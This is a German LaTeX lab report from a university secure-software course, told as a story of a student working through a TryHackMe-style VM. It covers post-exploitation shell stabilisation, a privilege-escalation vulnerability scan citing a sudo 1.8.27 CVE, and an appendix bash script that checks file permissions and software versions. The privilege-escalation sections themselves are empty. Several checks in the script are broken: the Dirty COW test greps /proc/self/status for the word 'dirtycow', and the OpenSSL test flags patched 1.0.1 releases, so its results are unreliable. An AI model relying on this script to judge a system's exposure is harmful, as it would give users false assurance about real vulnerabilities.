        \item[2.] \textit{Strg+z}  drücken, um die Shell als Hintergrundprozess zu betreiben und wieder zur lokalen Maschine zu gelangen.
        \item[3.] \textit{stty raw -echo;fg}  in der Konsole eingeben, um die Einstellung für die Kommandozeile festzulegen und die Shell nicht mehr als Hintergrundprozess zu betreiben.
        \item[4.] \textit{export TERM=xterm}  in der Konsole eingeben, um den Terminalemulator auf xterm zu setzen.
    \end{enumerate}

    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/shellStabilisierenGanz}
        \caption{Stabile Bash Shell nach Durführung der oben genannten Schritte}
        \label{fig:shellStabilisiert}
    \end{figure}
    \noindent





    \subsubsection{Scan auf Schwachstellen}
    \label{subsubsec:scanSchwachstellen}
    Tim lässt sich zu ersteinmal mit \textit{ls} alle Dateien und Verzeichnisse im aktuellen Verzeichnis zeigen, dabei stößt er direkt auf eine Datei names SuperSecretFlag.txt.
    Beim Versuch die Datei zu öffnen zeigt sich jedoch, einzig und alleine der root Nutzer hat Zugriff auf die Datei.

    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/FileDenied}
        \caption{Zugriff auf die Datei SuperSecretFile.txt nicht möglich}
        \label{fig:fileDenied}
    \end{figure}
    \noindent
    Für Tim steht fest, er muss root Nutzer werden, denn so leicht gibt er nicht auf.
    Wie der \href{https://tryhackme.com/jr/t1mth3h4ck3rb0y}{\textbf{TryHackMe Raum}}~\parencite{privilegeEscalationRaumTryHackMe} zeigt, gibt es hierfür verschiedene Herangehensweisen.
    Tim entscheidet sich erst einmal einen Basic Scan durchzuführen.
    Dafür nutzt er ein selbstgeschriebenes Skript (\ref{lst:schwachstellentestSkript}), welches auf verschieden Schwachstellen testet.
    Darunter fallen unter anderem eine fehlerhafte Konfiguration sensibler Dateien, anfällige Versionen von Sudo oder OpenSSl.
    Hierfür gibt es ebenfalls Skripte auf GitHub oder verschiedene anerkannte Tools wie OpenVas, Nikto oder Lynis die diese Arbeit erleichtern.
    \\
    Wie Tim weiß, sind folgenden Schritte notwendig um das Skript auszuführen:
    \begin{enumerate}[leftmargin=2.5cm]
        \item[1.] \textit{nano scan.sh}  in die Kommandozeile eingeben, um eine Datei namens scan.sh im Texteditor nano zu öffnen.
        \item[2.] Den Code des Skriptes im Editor einfügen und als scan.sh speichern.
        \item[3.] \textit{chmod +x scan.sh}  in die Kommandozeile eingeben, um die Rechte zu ändern und die Datei ausführbar zu machen.
        \item[4.] \textit{bash scan.sh}  anwenden, um die Datei und somit das Skript auszuführen.
        \item[5.] Alternativ können die Rechte der Datei /etc/passwd auch mit dem Befehl \textit{ls -la /etc/passwd} und die Sudo Version mit \textit{sudo --version} abgefragt werde.
        Weitere Recherchen auf \href{https://www.exploit-db.com/exploits/47502}{exploit-db} oder auf \href{https://www.cvedetails.com/cve/CVE-2019-14287/}{CVE Details} zur Sudo Version 1.8.27 ergeben eine mögliche Schwachstelle.
    \end{enumerate}


    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/ScanSchwachstellen}
        \caption{Scan auf Schwachstellen nach oben beschriebenen Vorgehen.
        Mögliche Schwachstellen erkannt bei den Schreibrechten der /etc/passwd Datei und der Sudo Version 1.8.27.}
        \label{fig:scan}
    \end{figure}
    \noindent



    \subsubsection{Privilege Escalation unter Ausnutzung der /etc/passwd Datei}
    \label{subsubsec:privilegeEscalation1}

    \subsubsection{Privilege Escalation unter Ausnutzung Sudo Version 1.8.27}
    \label{subsubsec:privilegeEscalation2}






%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	4.Lessons Learned
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage
    \section{Lessons Learned}
    \label{sec:lessonsLearned}





%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	7.Danksagung
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \vspace{5cm}
    \hline
    \vspace{1cm}
    \noindent
    \textbf{Danksagung}
    \\
    \\
    Wir bedanken uns bei \textit{Prof. Dr.-Ing. Andreas Mayer} für die Betreuung im Rahmen des Kurses Praktikum sichere Software-Entwicklung an der Hochschule Heilbronn.
    \vspace{1cm}
    \hline
    \vspace{2cm}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	7.Bibliographie
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage
    \section{Literaturverzeichnis}
    \label{sec:bibliographie}
    \printbibliography[title=""]

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	8.Abkürzungsverzeichnis
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage

    \section{Abkürzungsverzeichnis}
    \label{sec:abkuerzungsverzeichnis}
    \begin{acronym}
        \acro{xss}[XSS]{Cross-Site Scripting}
        \acro{ilias}[ILIAS]{Integriertes Lern-, Informations- und Arbeitskooperations-System}
        \acro{owasp}[OWASP]{Open Web Application Security Project}
        \acro{vm}[VM]{Virtuellen Maschinen}
    \end{acronym}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	9.Anhang
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage
    \section{Anhang}
    \label{sec:Anhang}

    \begin{lstlisting}[label={lst:schwachstellentestSkript}]
        #!/bin/bash

        #Sensitive files to test
        sensitive_files=("/etc/shadow" "/etc/sudoers" "/etc/group" "/etc/passwd")

        #Test sensitive files for world-writable permissions
        for file in "${sensitive_files[@]}"; do
            if [[ -w "$file" ]]; then
                echo "$file is world-writable. This is a potential vulnerability."
            else
                echo "$file is not world-writable."
            fi
        done

        #Check sudo version for known vulnerabilities
        sudo_version=$(sudo -V | grep "Sudo version" | awk '{print $3}')

        #List known vulnerable sudo versions
        known_vulnerable_sudo_versions=("1.8.20" "1.8.21p2" "1.8.22" "1.8.23" "1.8.24" "1.8.25" "1.8.26" "1.8.27")

        #Check if sudo version is vulnerable
        if [[ " ${known_vulnerable_sudo_versions[@]} " =~ " ${sudo_version} " ]]; then
            echo "Sudo version $sudo_version is known to have vulnerabilities. It is recommended to update to a newer version."
        else
            echo "Sudo version $sudo_version is not known to have vulnerabilities."
        fi

        #Check ImageMagick version for known vulnerabilities
        identify_version=$(identify -version | grep "Version: ImageMagick" | awk '{print $3}')

        #List known vulnerable ImageMagick versions
        known_vulnerable_imagemagick_versions=("6.8.9-9" "6.8.9-10" "6.8.9-11" "6.9.3-8")

        #Check if ImageMagick version is vulnerable
        if [[ " ${known_vulnerable_imagemagick_versions[@]} " =~ " ${identify_version} " ]]; then
            echo "ImageMagick version $identify_version is known to have vulnerabilities. It is recommended to update to a newer version."
        else
            echo "ImageMagick version $identify_version is not known to have vulnerabilities."
        fi

        #Test for Heartbleed vulnerability (CVE-2014-0160)
        openssl version -a | grep -q "OpenSSL 1.0.1"
        if [ $? -eq 0 ]; then
            echo "OpenSSL version 1.0.1 detected. This version is vulnerable to Heartbleed (CVE-2014-0160)."
        else
            echo "OpenSSL version 1.0.1 NOT detected. This version is NOT vulnerable to Heartbleed (CVE-2014-0160)."
        fi

        #Test for the Dirty COW vulnerability (CVE-2016-5195)
        dirtycow=$(grep -q "dirtycow" /proc/self/status && echo "Vulnerable" || echo "Not vulnerable.")
        echo "Dirty COW vulnerability status: $dirtycow"

        echo "Vulnerability tests completed."
    \end{lstlisting} Skript zum Testen verschiedener Schwachstellen (Schreibrechte wichtiger Dateien, Sudo, ImageMagick, OpenSSL).




\end{document}

